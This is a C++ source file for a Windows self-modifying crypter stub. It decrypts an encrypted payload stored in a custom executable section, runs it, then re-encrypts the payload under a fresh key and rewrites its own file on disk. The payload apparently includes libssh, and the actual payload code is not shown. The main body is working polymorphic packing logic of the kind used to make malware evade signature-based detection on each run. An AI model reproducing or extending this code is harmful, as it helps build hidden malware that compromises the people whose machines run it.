// load payload first
// libssh wants to be loaded before windows.h
#include "../payload/entry.cpp"

#include <windows.h>
#include <iostream>
#include <fstream>
#include "cryptor.cpp"

#pragma section(".replace", read)
__declspec(allocate(".replace")) INT32 payload_offet_from_me = 1;
__declspec(allocate(".replace")) UINT32 payload_segment_length = 2;
__declspec(allocate(".replace")) UINT32 payload_key = 3;
__declspec(allocate(".replace")) UINT32 replace_file_address = 4;
__declspec(allocate(".replace")) UINT32 payload_file_address = 5;

int main(int argc, char const *argv[])
{
	auto payloadStartAddr = (char*) INT32(&payload_offet_from_me) + payload_offet_from_me;
	
	printf("offset: %i / %x / %p\n", payload_offet_from_me, payload_offet_from_me, &payload_offet_from_me);
	printf("length: %u / %p\n", payload_segment_length, &payload_segment_length);
	printf("payload key: %u\n", payload_key);
	printf("replace file addr: %u\n", replace_file_address);
	printf("payload file address: %u\n", payload_file_address);
	printf("payload func addr: %p\n", &start_payload);
	printf("computed start of payload: %p\n", payloadStartAddr);
	printf("computed end of payload: %p\n", payloadStartAddr + payload_segment_length);

	printf("payload:\n");
	for (int i=0; i<payload_segment_length; i++) {
		printf("%hhx ", *(payloadStartAddr + i));
	}
	printf("\n");

	unsigned next_key;
	crypt_array(payloadStartAddr, payload_segment_length, payload_key, &next_key);

	printf("decrypted payload:\n");
	for (int i=0; i<payload_segment_length; i++) {
		printf("%hhx ", *(payloadStartAddr + i));
	}
	printf("\n");

	int result = start_payload(argc, argv);
	
	// ----------------------
	// write new encrypted payload and the corresponding key to the file
	
	// encrypt payload with the new key
	crypt_array(payloadStartAddr, payload_segment_length, next_key, nullptr);

	// move the running file to a new location
	// because windows doesnt let you overwrite a running file
	std::string targetFilePath = std::string(argv[0]);
	std::string tempFilePath = targetFilePath + ".old";
	if ( !MoveFileExA(targetFilePath.c_str(), tempFilePath.c_str(), MOVEFILE_REPLACE_EXISTING | MOVEFILE_WRITE_THROUGH) ) {
		fprintf(stderr, "moving running file: %d", GetLastError());
		return 1;
	}

	// create a copy of the file we can edit, put it on the same path the client used to run the program
	if ( !CopyFileA(tempFilePath.c_str(), targetFilePath.c_str(), true) ) {
		fprintf(stderr, "copying running file: %d", GetLastError());
		return 1;
	}

	// using ofstream or fstream without ios::in causes the file to be truncated
	std::fstream selfFile(targetFilePath, std::ios::binary | std::ios::out | std::ios::in);
	if (!selfFile.is_open()) {
		fprintf(stderr, "couldnt open file\n");
		return 1;
	}

	// update payload decryption key in file
	printf("next key: %u\n", next_key);
	selfFile.seekp(replace_file_address + 8, std::ios::beg);
	selfFile.write(reinterpret_cast<char*>(&next_key), sizeof next_key);

	// update payload in file
	selfFile.seekp(payload_file_address, std::ios::beg);
	selfFile.write(payloadStartAddr, payload_segment_length);

	// finish
	selfFile.close();

	// TODO: we are currently leaving tempFilePath around, I could maybe spawn a detached shell to destroy it tho

	return result;
}
